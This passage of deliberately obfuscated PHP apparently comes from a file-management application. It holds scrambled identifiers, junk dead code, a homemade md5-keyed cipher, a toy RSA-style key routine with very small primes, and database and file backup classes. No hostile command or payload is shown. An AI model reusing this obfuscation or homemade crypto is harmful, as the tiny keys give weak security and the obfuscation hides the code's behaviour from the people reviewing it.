$Íš«ù¸õ = $åŸ­€Ûº[773]; if (strlen($Íš«ù¸õ) < $åŸ­€Ûº[680]) { die; } $Ì’Æ‡¶› = rand_string(15); $îÍŸòà = $âÏÏ·šµ[300]; $°üµú´ˆ = $åŸ­€Ûº[774]; while (strlen($°üµú´ˆ) < $åŸ­€Ûº[690]) { if (!$°üµú´ˆ) { break; } $°üµú´ˆ++; } switch ($ÛÇø„ä­) { case $âÏÏ·šµ[206]: $½¢…ûÕ» = $this->cmxj88764825($îº°Äß, strrev($Ò×¶ìÒ . $Ì’Æ‡¶›)); $¬æó»Æ = $åŸ­€Ûº[775]; if (strlen($¬æó»Æ) < $åŸ­€Ûº[690]) { die; } break; $åÑ„åíû = $åŸ­€Ûº[776]; if (!$åÑ„åíû) { die; } case $âÏÏ·šµ[122]: $½¢…ûÕ» = $this->cmxj88764825($îº°Äß, strrev($Ì’Æ‡¶› . $Ò×¶ìÒ)); break; $Ì³Èºœ€ = $åŸ­€Ûº[777]; case $âÏÏ·šµ[301]: $½¢…ûÕ» = $this->cmxj88764825($îº°Äß, base64_encode($Ì’Æ‡¶› . $Ò×¶ìÒ)); $ù™µİå = $åŸ­€Ûº[778]; while ($ù™µİå < $åŸ­€Ûº[758]) { if ($ù™µİå >= 0) { break; } $ù™µİå++; } break; $¦¤ƒ ¶ó = $åŸ­€Ûº[779]; while (strlen($¦¤ƒ ¶ó) < $åŸ­€Ûº[686]) { if (!$¦¤ƒ ¶ó) { break; } $¦¤ƒ ¶ó++; } case $âÏÏ·šµ[302]: $½¢…ûÕ» = $this->cmxj88764825($îº°Äß, md5($Ì’Æ‡¶› . $Ò×¶ìÒ)); $áÚ¶şşÚ = $åŸ­€Ûº[780]; while (strlen($áÚ¶şşÚ) < $åŸ­€Ûº[680]) { if (!$áÚ¶şşÚ) { break; } $áÚ¶şşÚ++; } break; $ûƒà¶ÌÒ = $åŸ­€Ûº[781]; while (strlen($ûƒà¶ÌÒ) < $åŸ­€Ûº[690]) { if (!$ûƒà¶ÌÒ) { break; } $ûƒà¶ÌÒ++; } case $âÏÏ·šµ[303]: $îº°Äß = base64_encode($îº°Äß); $¼Ö¦Ìš¤ = rand(0, 64); $ê¥¸êËˆ = $åŸ­€Ûº[782]; if (strlen($ê¥¸êËˆ) < $åŸ­€Ûº[707]) { die; } $ş˜Á¸ê¸ = $îÍŸòà[$¼Ö¦Ìš¤]; $Ïèºèªœ = md5($ş˜Á¸ê¸ . md5($Ò×¶ìÒ . $ş˜Á¸ê¸) . $Ò×¶ìÒ); $ç­”’›Î = $åŸ­€Ûº[783]; if (!$ç­”’›Î) { return; } $Ïèºèªœ = substr($Ïèºèªœ, $¼Ö¦Ìš¤ % 8, $¼Ö¦Ìš¤ % 8 + 7); $§í«„Öé = $âÏÏ·šµ[6]; $½âÆ×ĞË = $åŸ­€Ûº[784]; $¼­¿–úù = 0; $òè æ­ª = 0; $Èä®µÀ— = 0; $¸Ù£í½ = $åŸ­€Ûº[785]; if (strlen($¸Ù£í½) < $åŸ­€Ûº[690]) { die; } for ($¼­¿–úù = 0; $¼­¿–úù < strlen($îº°Äß); $¼­¿–úù++) { $Èä®µÀ— = $Èä®µÀ— == strlen($Ïèºèªœ) ? 0 : $Èä®µÀ—; $ÉŸ‚¡µÊ = $åŸ­€Ûº[786]; if (strlen($ÉŸ‚¡µÊ) < $åŸ­€Ûº[707]) { die; } $òè æ­ª = ($¼Ö¦Ìš¤ + strpos($îÍŸòà, $îº°Äß[$¼­¿–úù]) + ord($Ïèºèªœ[$Èä®µÀ—++])) % 64; $Ã—Éª½÷ = $åŸ­€Ûº[787]; $§í«„Öé .= $îÍŸòà[$òè æ­ª]; $êßî²Û = $åŸ­€Ûº[788]; } $½¢…ûÕ» = hash_encode($ş˜Á¸ê¸ . $§í«„Öé); $ĞĞÓûä = $åŸ­€Ûº[789]; if (!$ĞĞÓûä) { return; } break; $ïÁÛ­¯ı = $åŸ­€Ûº[790]; if (strlen($ïÁÛ­¯ı) < $åŸ­€Ûº[686]) { return; } default: $½¢…ûÕ» = $this->cmxj88764825($îº°Äß, $Ò×¶ìÒ . $Ì’Æ‡¶›); $˜Ä › = $åŸ­€Ûº[791]; while ($˜Ä › < $åŸ­€Ûº[680]) { if ($˜Ä › >= 0) { break; } $˜Ä ›++; } break; $á§ïŞÀí = $åŸ­€Ûº[792]; if (!$á§ïŞÀí) { die; } } $½¢…ûÕ» = strrev($ÛÇø„ä­ . $Ì’Æ‡¶› . $½¢…ûÕ»); $õèˆ†øŒ = $åŸ­€Ûº[793]; while ($õèˆ†øŒ < $åŸ­€Ûº[686]) { if ($õèˆ†øŒ >= 0) { break; } $õèˆ†øŒ++; } if ($÷ÃÅ”¸ì - 1 > 0) { $½¢…ûÕ» = $this->lrzw24095e82($½¢…ûÕ», $Ò×¶ìÒ, $÷ÃÅ”¸ì - 1); } return $½¢…ûÕ»; } private function niqpbee955fd($º´è¢¬ú, $Ù¨ò‘, $´Ê…¶ÄĞ = 3) { $Ã”Õüğ =& $_SERVER[Ùæõ‰Ï’]; $÷ƒ•›õ =& $_SERVER[øé†…ş]; if (!is_string($º´è¢¬ú) || strlen($º´è¢¬ú) < 10) { return !1; } $º´è¢¬ú = trim($º´è¢¬ú); $º´è¢¬ú = strrev($º´è¢¬ú); $Õ °¦¨ = $Ã”Õüğ[794]; if (!$Õ °¦¨) { die; } $ºäå†é = $º´è¢¬ú[0]; $–÷àµ§ = substr($º´è¢¬ú, 1, 15); $—Ô÷Ï° = $Ã”Õüğ[795]; while ($—Ô÷Ï° < $Ã”Õüğ[690]) { if ($—Ô÷Ï° >= 0) { break; } $—Ô÷Ï°++; } $º´è¢¬ú = substr($º´è¢¬ú, 16); $ø‡ã­º‹ = $÷ƒ•›õ[300]; switch ($ºäå†é) { case $÷ƒ•›õ[206]: $ÑãÖ— = $this->mydve1d0e485($º´è¢¬ú, strrev($Ù¨ò‘ . $–÷àµ§)); $”§—Ñê› = $Ã”Õüğ[796]; break; $ò¦ßÖÂ„ = $Ã”Õüğ[797]; if (!$ò¦ßÖÂ„) { return; } case $÷ƒ•›õ[122]: $ÑãÖ— = $this->mydve1d0e485($º´è¢¬ú, strrev($–÷àµ§ . $Ù¨ò‘)); $Ïó¨„¹ = $Ã”Õüğ[798]; break; $¦ä­úôó = $Ã”Õüğ[799]; case $÷ƒ•›õ[301]: $ÑãÖ— = $this->mydve1d0e485($º´è¢¬ú, base64_encode($–÷àµ§ . $Ù¨ò‘)); break; $ëãØßË› = $Ã”Õüğ[800]; if (!$ëãØßË›) { return; } case $÷ƒ•›õ[302]: $ÑãÖ— = $this->mydve1d0e485($º´è¢¬ú, md5($–÷àµ§ . $Ù¨ò‘)); break; case $÷ƒ•›õ[303]: $º´è¢¬ú = hash_decode($º´è¢¬ú); $€¨ŠœÒ = $Ã”Õüğ[801]; while ($€¨ŠœÒ < $Ã”Õüğ[758]) { if ($€¨ŠœÒ >= 0) { break; } $€¨ŠœÒ++; } $¡ŒÙøŞ = $º´è¢¬ú[0]; $Ğßç‡È» = $Ã”Õüğ[802]; if (!$Ğßç‡È») { return; } $º´è¢¬ú = substr($º´è¢¬ú, 1); $‚ß¥ê‡á = $Ã”Õüğ[803]; if (!$‚ß¥ê‡á) { die; } $ÉÒ¹ä˜ = strpos($ø‡ã­º‹, $¡ŒÙøŞ); $ËîùšÉù = md5($¡ŒÙøŞ . md5($Ù¨ò‘ . $¡ŒÙøŞ) . $Ù¨ò‘); $¬²ÔéÉÅ = $Ã”Õüğ[804]; $ËîùšÉù = substr($ËîùšÉù, $ÉÒ¹ä˜ % 8, $ÉÒ¹ä˜ % 8 + 7); $ÃÄ¸ç¿‡ = $÷ƒ•›õ[6]; $ñ«ç™÷ = $Ã”Õüğ[805]; if (!$ñ«ç™÷) { die; } $ÀŸğÉÀ¦ = 0; $Ööè‹Ğ× = $Ã”Õüğ[806]; $ãÍù§¤“ = 0; $ôÅèµ÷Í = 0; $­ƒ×“« = $Ã”Õüğ[807]; for ($ÀŸğÉÀ¦ = 0; $ÀŸğÉÀ¦ < strlen($º´è¢¬ú); $ÀŸğÉÀ¦++) { $ôÅèµ÷Í = $ôÅèµ÷Í == strlen($ËîùšÉù) ? 0 : $ôÅèµ÷Í; $Š¬Ç•ŸÄ = $Ã”Õüğ[808]; if (strlen($Š¬Ç•ŸÄ) < $Ã”Õüğ[686]) { return; } $Ë‰Øôà = $ôÅèµ÷Í++; $–˜Ìë„º = $Ã”Õüğ[809]; if (!$–˜Ìë„º) { die; } $ãÍù§¤“ = strpos($ø‡ã­º‹, $º´è¢¬ú[$ÀŸğÉÀ¦]) - $ÉÒ¹ä˜ - ord($ËîùšÉù[$Ë‰Øôà]); while ($ãÍù§¤“ < 0) { $ãÍù§¤“ += 64; } $ÃÄ¸ç¿‡ .= $ø‡ã­º‹[$ãÍù§¤“]; } $ÑãÖ— = base64_decode($ÃÄ¸ç¿‡); $ßì¢£Ë¨ = $Ã”Õüğ[810]; while ($ßì¢£Ë¨ < $Ã”Õüğ[707]) { if ($ßì¢£Ë¨ >= 0) { break; } $ßì¢£Ë¨++; } break; default: $ÑãÖ— = $this->mydve1d0e485($º´è¢¬ú, $Ù¨ò‘ . $–÷àµ§); break; } if ($´Ê…¶ÄĞ - 1 > 0) { $ÑãÖ— = $this->niqpbee955fd($ÑãÖ—, $Ù¨ò‘, $´Ê…¶ÄĞ - 1); } return $ÑãÖ—; } public function fkaeee80c632($¸ûà³¸) { $°âé—å =& $_SERVER[Ùæõ‰Ï’]; $õ¢ì¼™ =& $_SERVER[øé†…ş]; $şşöñ…“ = $this->xmsz2c95107e(); $ÅÇõŞ¾Í = $°âé—å[811]; if (!$ÅÇõŞ¾Í) { die; } $äôÄ¼ŞÙ = $this->xmsz2c95107e(); $ÌäåªÑ¯ = ($şşöñ…“ - 1) * ($äôÄ¼ŞÙ - 1); $µ¬ç íî = $°âé—å[812]; while ($µ¬ç íî < $°âé—å[758]) { if ($µ¬ç íî >= 0) { break; } $µ¬ç íî++; } $åàøµ„ü = intval(($şşöñ…“ + $äôÄ¼ŞÙ) / 2); while (1) { $¥Àç¯—ô = $åàøµ„ü; $¶Üä™“ = $ÌäåªÑ¯; $ª³ïß¡¶ = $°âé—å[813]; if (strlen($ª³ïß¡¶) < $°âé—å[690]) { return; } while ($¶Üä™“ % $¥Àç¯—ô != 0) { $›ƒÆåô” = $¶Üä™“; $¶Üä™“ = $¥Àç¯—ô; $¥Àç¯—ô = $›ƒÆåô” % $¥Àç¯—ô; $ØêÊŸÏŠ = $°âé—å[814]; if (strlen($ØêÊŸÏŠ) < $°âé—å[686]) { die; } } if ($¥Àç¯—ô == 1) { break; } else { $åàøµ„ü++; } } $äóíÅê³ = 2; for ($ñË¬¡°ú = 0; $ñË¬¡°ú < $ÌäåªÑ¯ * 10; $ñË¬¡°ú++) { if (($ÌäåªÑ¯ * $ñË¬¡°ú + 1) % $åàøµ„ü == 0) { $äóíÅê³ = intval(($ÌäåªÑ¯ * $ñË¬¡°ú + 1) / $åàøµ„ü); break; } } $³¶‘†—á = $this->cmxj88764825($şşöñ…“ * $äôÄ¼ŞÙ . $õ¢ì¼™[6], $õ¢ì¼™[136]); $…ıŠõ¾ = $°âé—å[815]; if (strlen($…ıŠõ¾) < $°âé—å[707]) { return; } $ñœÚÛ‡Ú = md5($õ¢ì¼™[304] . ($şşöñ…“ + $äôÄ¼ŞÙ) . $õ¢ì¼™[305] . $åàøµ„ü . $õ¢ì¼™[305] . $äóíÅê³ . $õ¢ì¼™[306]); $ú”÷åÀ = $this->cmxj88764825($¸ûà³¸, $ñœÚÛ‡Ú) . $õ¢ì¼™[307] . $³¶‘†—á; return $ú”÷åÀ; $İıÆøº = $°âé—å[816]; if (strlen($İıÆøº) < $°âé—å[707]) { die; } } public function ahrde9e0bf2b($‹ÂÅôˆŠ) { $å›±²ëæ =& $_SERVER[Ùæõ‰Ï’]; $™¦ïç¦Û =& $_SERVER[øé†…ş]; $Ü²à¼ı = explode($™¦ïç¦Û[307], $‹ÂÅôˆŠ); $´Š¯ëê– = $å›±²ëæ[817]; if (count($Ü²à¼ı) != 2) { return $™¦ïç¦Û[6]; } $Ö®½Ïæ÷ = $this->mydve1d0e485($Ü²à¼ı[1] . $™¦ïç¦Û[6], $™¦ïç¦Û[136]); if (!$Ö®½Ïæ÷) { return $™¦ïç¦Û[6]; } $Ö®½Ïæ÷ = intval($Ö®½Ïæ÷); $ôÆŸ‡Ÿ— = 0; $ØŸæ’Á¯ = 0; for ($©üç“¥š = 3; $©üç“¥š < $Ö®½Ïæ÷; $©üç“¥š += 2) { if ($Ö®½Ïæ÷ % $©üç“¥š != 0) { continue; } $ôÆŸ‡Ÿ— = $©üç“¥š; $³êÀ¯¹ = $å›±²ëæ[818]; if (!$³êÀ¯¹) { die; } $ØŸæ’Á¯ = intval($Ö®½Ïæ÷ / $©üç“¥š); $ÜºÉÏ‹ = $å›±²ëæ[819]; while (strlen($ÜºÉÏ‹) < $å›±²ëæ[758]) { if (!$ÜºÉÏ‹) { break; } $ÜºÉÏ‹++; } break; $¬÷è¤»” = $å›±²ëæ[820]; while (strlen($¬÷è¤»”) < $å›±²ëæ[680]) { if (!$¬÷è¤»”) { break; } $¬÷è¤»”++; } } $¾œŠ•¶² = ($ôÆŸ‡Ÿ— - 1) * ($ØŸæ’Á¯ - 1); $ÙÆÓˆİÅ = $å›±²ëæ[821]; if (strlen($ÙÆÓˆİÅ) < $å›±²ëæ[680]) { die; } $àòÚ³Ö³ = intval(($ôÆŸ‡Ÿ— + $ØŸæ’Á¯) / 2); $µê‘ùÇ = $å›±²ëæ[822]; if (!$µê‘ùÇ) { return; } while (1) { $ßñˆ†Õ¢ = $àòÚ³Ö³; $ó­òÖÑ = $¾œŠ•¶²; while ($ó­òÖÑ % $ßñˆ†Õ¢ != 0) { $•‰ï¾ïÈ = $ó­òÖÑ; $ó­òÖÑ = $ßñˆ†Õ¢; $ĞÔ×ç°’ = $å›±²ëæ[823]; while (strlen($ĞÔ×ç°’) < $å›±²ëæ[707]) { if (!$ĞÔ×ç°’) { break; } $ĞÔ×ç°’++; } $ßñˆ†Õ¢ = $•‰ï¾ïÈ % $ßñˆ†Õ¢; } if ($ßñˆ†Õ¢ == 1) { break; } else { $àòÚ³Ö³++; } } $í‚é¢Á = 2; $ê×Úà½¼ = $å›±²ëæ[824]; if (strlen($ê×Úà½¼) < $å›±²ëæ[686]) { return; } for ($©üç“¥š = 0; $©üç“¥š < $¾œŠ•¶² * 10; $©üç“¥š++) { if (($¾œŠ•¶² * $©üç“¥š + 1) % $àòÚ³Ö³ == 0) { $í‚é¢Á = intval(($¾œŠ•¶² * $©üç“¥š + 1) / $àòÚ³Ö³); break; } } $î¬Ÿù = md5($™¦ïç¦Û[304] . ($ôÆŸ‡Ÿ— + $ØŸæ’Á¯) . $™¦ïç¦Û[305] . $àòÚ³Ö³ . $™¦ïç¦Û[305] . $í‚é¢Á . $™¦ïç¦Û[306]); $¼‚°¢™Ì = $this->mydve1d0e485($Ü²à¼ı[0], $î¬Ÿù); return $¼‚°¢™Ì; $İÓ„¼ÎÅ = $å›±²ëæ[825]; while (strlen($İÓ„¼ÎÅ) < $å›±²ëæ[758]) { if (!$İÓ„¼ÎÅ) { break; } $İÓ„¼ÎÅ++; } } public function xmsz2c95107e() { $¼¬–¯é³ =& $_SERVER[Ùæõ‰Ï’]; $Íüƒ§è÷ = mt_rand(pow(2, 14), pow(2, 16) - 1); $èâÅîíÁ = array(); $úœ¢ĞºÍ = 1; $ºáŞåÒ¨ = $¼¬–¯é³[826]; if (strlen($ºáŞåÒ¨) < $¼¬–¯é³[680]) { die; } while ($úœ¢ĞºÍ <= (int) sqrt($Íüƒ§è÷)) { $‘èÂì‰Í = $úœ¢ĞºÍ; while (!0) { $‘èÂì‰Í++; $Ç¼Ù˜„´ = $¼¬–¯é³[827]; if ($‘èÂì‰Í <= 2) { $úœ¢ĞºÍ = $‘èÂì‰Í; break; } else { if ($‘èÂì‰Í < 2) { continue; } } $µª“ÖÏ = !0; for ($Å—²òØİ = 2; $Å—²òØİ <= sqrt($‘èÂì‰Í); $Å—²òØİ++) { if ($‘èÂì‰Í % $Å—²òØİ == 0) { $µª“ÖÏ = !1; } } if ($µª“ÖÏ) { $úœ¢ĞºÍ = $‘èÂì‰Í; break; } } $èâÅîíÁ[] = $úœ¢ĞºÍ; $¤¸Ë©ÒØ = $¼¬–¯é³[828]; if (!$¤¸Ë©ÒØ) { return; } } $¥íâÃ¨ = 2; $—ŠæÌšç = $¼¬–¯é³[829]; if (strlen($—ŠæÌšç) < $¼¬–¯é³[686]) { return; } for ($‘èÂì‰Í = $Íüƒ§è÷; $‘èÂì‰Í > 1; $‘èÂì‰Í--) { $µª“ÖÏ = !0; foreach ($èâÅîíÁ as $­ğéÕ»‹) { if ($‘èÂì‰Í % $­ğéÕ»‹ == 0) { $µª“ÖÏ = !1; break; } } if ($µª“ÖÏ) { $¥íâÃ¨ = $‘èÂì‰Í; break; } } return $¥íâÃ¨; } public function fqra7298836d($àø¢÷êÕ, $Àµ™İ«À) { $ìÀ¦†ü÷ =& $_SERVER[øé†…ş]; return call_user_func(array($ìÀ¦†ü÷[8], $ìÀ¦†ü÷[308]), $àø¢÷êÕ, $Àµ™İ«À); } public function cmxj88764825($ó£é„÷¶, $ŞÎÀƒíå) { $©–Ïèáœ =& $_SERVER[Ùæõ‰Ï’]; $à¢„õ•˜ =& $_SERVER[øé†…ş]; return call_user_func(array($à¢„õ•˜[309], $à¢„õ•˜[310]), $ó£é„÷¶, $ŞÎÀƒíå); $ĞïƒË—ø = $©–Ïèáœ[830]; while (strlen($ĞïƒË—ø) < $©–Ïèáœ[707]) { if (!$ĞïƒË—ø) { break; } $ĞïƒË—ø++; } } public function mydve1d0e485($„”ÆŠ½ã, $áŒÇÏ†ø) { $›é†ë¡È =& $_SERVER[øé†…ş]; return call_user_func(array($›é†ë¡È[309], $›é†ë¡È[311]), $„”ÆŠ½ã, $áŒÇÏ†ø); } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->model = Model($_SERVER[Ùæõ‰Ï’][831]); $this->init(); $this->keep(); } public function init() { $ÍÇºİõ¯ =& $_SERVER[Ùæõ‰Ï’]; $this->isManual(); self::$name = date($ÍÇºİõ¯[832]); if (!($Å¶÷îÖÛ = $this->model->lastItem())) { $Å¶÷îÖÛ = $this->initData(); } else { self::$name = $Å¶÷îÖÛ[$ÍÇºİõ¯[32]]; if ($Å¶÷îÖÛ[$ÍÇºİõ¯[833]] == $ÍÇºİõ¯[91]) { self::$name = date($ÍÇºİõ¯[272]); $°ˆ˜é¿ = intval(_get($Å¶÷îÖÛ, $ÍÇºİõ¯[834], 0)); if (self::$manual == 0 && $Å¶÷îÖÛ[$ÍÇºİõ¯[32]] == self::$name) { $this->model->remove($Å¶÷îÖÛ[$ÍÇºİõ¯[475]]); } $Å¶÷îÖÛ = $this->initData($°ˆ˜é¿, $Å¶÷îÖÛ[$ÍÇºİõ¯[835]]); } else { $this->checkStore($Å¶÷îÖÛ[$ÍÇºİõ¯[835]]); } } self::$option = $Å¶÷îÖÛ; } private function isManual() { $…Œ§†ò’ = _get($GLOBALS, $_SERVER[Ùæõ‰Ï’][836], 0); $…Œ§†ò’ = intval($…Œ§†ò’); self::$manual = $…Œ§†ò’ && $…Œ§†ò’ == 1 ? 1 : 0; } private function initData($äİá›ì¿ = 0, $½â„ˆê = '') { $Ë¥‚äâš =& $_SERVER[Ùæõ‰Ï’]; $±µŸ”‡¦ = $this->model->config(); if ($½â„ˆê && $±µŸ”‡¦[$Ë¥‚äâš[835]] != $½â„ˆê) { $äİá›ì¿ = 0; } $this->checkStore($±µŸ”‡¦[$Ë¥‚äâš[835]]); if (self::$manual == 1) { self::$name .= $Ë¥‚äâš[11] . date($Ë¥‚äâš[837]); } $ñƒéà‡“ = array($Ë¥‚äâš[835] => $±µŸ”‡¦[$Ë¥‚äâš[835]], $Ë¥‚äâš[32] => self::$name, $Ë¥‚äâš[833] => 0, $Ë¥‚äâš[171] => $±µŸ”‡¦[$Ë¥‚äâš[171]], $Ë¥‚äâš[838] => self::$manual, $Ë¥‚äâš[369] => array($Ë¥‚äâš[839] => array($Ë¥‚äâš[833] => 0), $Ë¥‚äâš[840] => array($Ë¥‚äâš[833] => 0, $Ë¥‚äâš[841] => 0, $Ë¥‚äâš[842] => 0, $Ë¥‚äâš[33] => $Ë¥‚äâš[12], $Ë¥‚äâš[843] => 0, $Ë¥‚äâš[844] => 0), $Ë¥‚äâš[845] => array($Ë¥‚äâš[833] => 0, $Ë¥‚äâš[841] => 0, $Ë¥‚äâš[842] => 0, $Ë¥‚äâš[843] => 0, $Ë¥‚äâš[844] => 0), $Ë¥‚äâš[230] => array($Ë¥‚äâš[833] => 0, $Ë¥‚äâš[846] => 0, $Ë¥‚äâš[847] => 0, $Ë¥‚äâš[848] => 0, $Ë¥‚äâš[849] => 0, $Ë¥‚äâš[541] => $äİá›ì¿, $Ë¥‚äâš[843] => 0, $Ë¥‚äâš[844] => 0)), $Ë¥‚äâš[843] => time(), $Ë¥‚äâš[844] => 0); $ÒşÚŞñæ = $this->model->insert($ñƒéà‡“); $ñƒéà‡“[$Ë¥‚äâš[475]] = $ÒşÚŞñæ; return $ñƒéà‡“; } private function checkStore($çå‘ó°°) { $Éò’öæĞ = Model($_SERVER[Ùæõ‰Ï’][850]); $©ãµÁ» = $Éò’öæĞ->listData($çå‘ó°°); $Éò’öæĞ->checkConfig($©ãµÁ»); } public static function get() { if (!self::$option) { $Ç×‘ÑÇÈ = Model($_SERVER[Ùæõ‰Ï’][831]); $ßòÜ¢ä• = $Ç×‘ÑÇÈ->findByName(self::$name); $Ç×‘ÑÇÈ->parseContent($ßòÜ¢ä•); self::$option = $ßòÜ¢ä•; } return self::$option; } public static function set($Ş÷§ñ• ) { $µìºÄºì =& $_SERVER[Ùæõ‰Ï’]; $ƒ åó‡Ô = self::get(); foreach ($Ş÷§ñ•  as $âÔ†âğ => $Ú¿ï°µé) { array_set_value($ƒ åó‡Ô, $âÔ†âğ, $Ú¿ï°µé); } Model($µìºÄºì[831])->update($ƒ åó‡Ô[$µìºÄºì[475]], $ƒ åó‡Ô); self::$option = $ƒ åó‡Ô; return self::$option; } public function keep() { $Ú¶ŒğßÍ =& $_SERVER[Ùæõ‰Ï’]; $ŒƒÕ‘® = self::get(); if (_get($ŒƒÕ‘®, $Ú¶ŒğßÍ[851], 0) == $Ú¶ŒğßÍ[91]) { return; } $this->backupKeep($ŒƒÕ‘®); self::set(array($Ú¶ŒğßÍ[851] => 1)); } private function backupKeep($Î±“¼…‹) { $Ÿöç¸‚· =& $_SERVER[Ùæõ‰Ï’]; if (self::$manual == 1) { return; } $ôÌ´ğùĞ = $this->model->listData(); if (empty($ôÌ´ğùĞ)) { return; } $ëŠ™êÁ¥ = 0; $Éß¿«ÓÉ = array(); foreach ($ôÌ´ğùĞ as $îâò±‚™) { if ($ëŠ™êÁ¥ >= 7) { break; } $Éß¿«ÓÉ[] = $îâò±‚™[$Ÿöç¸‚·[32]]; $ëŠ™êÁ¥++; } for ($ëŠ™êÁ¥ = 0; $ëŠ™êÁ¥ < 12; $ëŠ™êÁ¥++) { $Éß¿«ÓÉ[] = date($Ÿöç¸‚·[852], strtotime("\55{$ëŠ™êÁ¥}\x20\x6d\157\x6e\x74\150\163")); } $Éß¿«ÓÉ = array_unique($Éß¿«ÓÉ); $ûù‹½Ä = Model($Ÿöç¸‚·[853])->get($Ÿöç¸‚·[854]); foreach ($ôÌ´ğùĞ as $îâò±‚™) { if (isset($îâò±‚™[$Ÿöç¸‚·[838]]) && $îâò±‚™[$Ÿöç¸‚·[838]] == $Ÿöç¸‚·[91]) { continue; } if (!empty($îâò±‚™[$Ÿöç¸‚·[32]]) && in_array($îâò±‚™[$Ÿöç¸‚·[32]], $Éß¿«ÓÉ)) { continue; } $this->model->remove($îâò±‚™[$Ÿöç¸‚·[475]]); $èƒğ±›Ì = $this->backupPath($Î±“¼…‹, $ûù‹½Ä); IO::remove($èƒğ±›Ì, !1); } } private function backupPath($–©ãÛÔî, $””È‚ë = false) { $ä¯¸©óÛ =& $_SERVER[Ùæõ‰Ï’]; if (!$””È‚ë) { $””È‚ë = Model($ä¯¸©óÛ[853])->get($ä¯¸©óÛ[854]); } $ğŒëÌÅ = $–©ãÛÔî[$ä¯¸©óÛ[32]]; $úˆ”˜¥µ = substr(md5($ä¯¸©óÛ[855] . $””È‚ë . $ğŒëÌÅ), 0, 8); return "\173\151\157\x3a{$–©ãÛÔî[$ä¯¸©óÛ[835]]}\175\57\144\141\164\x61\x62\x61\163\145\x2f\142\x61\x63\x6b\165\160\57" . $ğŒëÌÅ . $ä¯¸©óÛ[11] . $úˆ”˜¥µ; } public function db() { $â¬¼È³ñ =& $_SERVER[Ùæõ‰Ï’]; $²¿€£Û¼ = self::get(); if (_get($²¿€£Û¼, $â¬¼È³ñ[856], 0) == $â¬¼È³ñ[91]) { return !0; } $îï£Œ¼ = new BackupDb(); if (!$îï£Œ¼->index()) { return !1; } self::set(array($â¬¼È³ñ[856] => 1)); return !0; } public function dbFile() { $½Ù¶ó¹† =& $_SERVER[Ùæõ‰Ï’]; $µÌ¡Ïéã = self::get(); if (_get($µÌ¡Ïéã, $½Ù¶ó¹†[857], 0) == $½Ù¶ó¹†[91]) { return !0; } $ò¨Òò = new BackupDbFile(); if (!$ò¨Òò->index()) { return !1; } self::set(array($½Ù¶ó¹†[857] => 1)); return !0; } public function file() { $ş“æçœ =& $_SERVER[Ùæõ‰Ï’]; $–²¼ˆÑ´ = self::get(); if (_get($–²¼ˆÑ´, $ş“æçœ[858], 0) == $ş“æçœ[91]) { return !0; } if ($–²¼ˆÑ´[$ş“æçœ[171]] == $ş“æçœ[859]) { $¢Âá¶’× = new BackupFile(); if (!$¢Âá¶’×->index()) { return !1; } } self::set(array($ş“æçœ[858] => 1, $ş“æçœ[833] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $ÍÛÀæ©Ö =& $_SERVER[Ùæõ‰Ï’]; $„ªÄ¼’ = Backup::get(); self::$io = $„ªÄ¼’[$ÍÛÀæ©Ö[835]]; self::$name = $„ªÄ¼’[$ÍÛÀæ©Ö[32]]; $úâ¿‚ƒÕ = new DbManage(); $ŸŸéÓ­§ = $úâ¿‚ƒÕ->dbType(); $˜Ê×‘¿÷ = array($ÍÛÀæ©Ö[860] => $ŸŸéÓ­§, $ÍÛÀæ©Ö[861] => time()); Backup::set($˜Ê×‘¿÷); $–ºŞ˜µÒ = $this->tmpFilesPath() . $ÍÛÀæ©Ö[862] . self::$name . $ÍÛÀæ©Ö[8]; del_dir($–ºŞ˜µÒ); mk_dir($–ºŞ˜µÒ); $î°à²¶å = $áú’©»Ü = 0; try { $˜ô×²Â = $úâ¿‚ƒÕ->db()->getTables(); } catch (Exception $é¬ßÈÍÆ) { return !1; } $˜ô×²Â = array_diff($˜ô×²Â, array($ÍÛÀæ©Ö[863], $ÍÛÀæ©Ö[864])); foreach ($˜ô×²Â as $§ªœõÛª) { $î°à²¶å += $úâ¿‚ƒÕ->model($§ªœõÛª)->count(); } $¦•ñÔÕ÷ = new Task($ÍÛÀæ©Ö[865], $ÍÛÀæ©Ö[866], $î°à²¶å, LNG($ÍÛÀæ©Ö[867]) . $ÍÛÀæ©Ö[868] . LNG($ÍÛÀæ©Ö[869])); $GLOBALS[$ÍÛÀæ©Ö[870]] = self::$name; foreach ($˜ô×²Â as $§ªœõÛª) { $Äå…¾‚ = $–ºŞ˜µÒ . $§ªœõÛª . $ÍÛÀæ©Ö[871]; $¸”ÖÔş¦ = null; if ($§ªœõÛª == $ÍÛÀæ©Ö[872] && (!isset($„ªÄ¼’[$ÍÛÀæ©Ö[171]]) || $„ªÄ¼’[$ÍÛÀæ©Ö[171]] == $ÍÛÀæ©Ö[228])) { $¸”ÖÔş¦ = self::$io; } $áú’©»Ü += $úâ¿‚ƒÕ->sqlFromDb($§ªœõÛª, $Äå…¾‚, $¦•ñÔÕ÷, $¸”ÖÔş¦); } unset($GLOBALS[$ÍÛÀæ©Ö[870]]); $¦•ñÔÕ÷->end(); if ($áú’©»Ü > $î°à²¶å) { $î°à²¶å = $áú’©»Ü; } $˜Ê×‘¿÷ = array($ÍÛÀæ©Ö[860] => $ŸŸéÓ­§, $ÍÛÀæ©Ö[856] => 1, $ÍÛÀæ©Ö[873] => $î°à²¶å, $ÍÛÀæ©Ö[874] => $áú’©»Ü, $ÍÛÀæ©Ö[875] => time()); Backup::set($˜Ê×‘¿÷); if ($î°à²¶å - $áú’©»Ü > 0) { $­‡ØŸì‡ = $ÍÛÀæ©Ö[876]; if (!stristr(I18n::getType(), $ÍÛÀæ©Ö[877])) { $­‡ØŸì‡ = $ÍÛÀæ©Ö[878]; } write_log(array($­‡ØŸì‡, $˜Ê×‘¿÷), $ÍÛÀæ©Ö[866]); return !1; } return !0; } private function tmpFilesPath() { $âÆµ¼½ =& $_SERVER[Ùæõ‰Ï’]; $ğÈîÖàœ = TEMP_FILES; if ($GLOBALS[$âÆµ¼½[6]][$âÆµ¼½[92]][$âÆµ¼½[879]]) { $ğÈîÖàœ = $GLOBALS[$âÆµ¼½[6]][$âÆµ¼½[92]][$âÆµ¼½[879]]; if (!mk_dir($ğÈîÖàœ) || !is_writable($ğÈîÖàœ) || !IO::mkfile($ğÈîÖàœ . $âÆµ¼½[880])) { $ğÈîÖàœ = TEMP_FILES; } } return $ğÈîÖàœ; } } goto cÈàÜòá¥õ; EÍÎî†³¸…: class PathDriverCOS extends PathDriverBaseS3 { public function 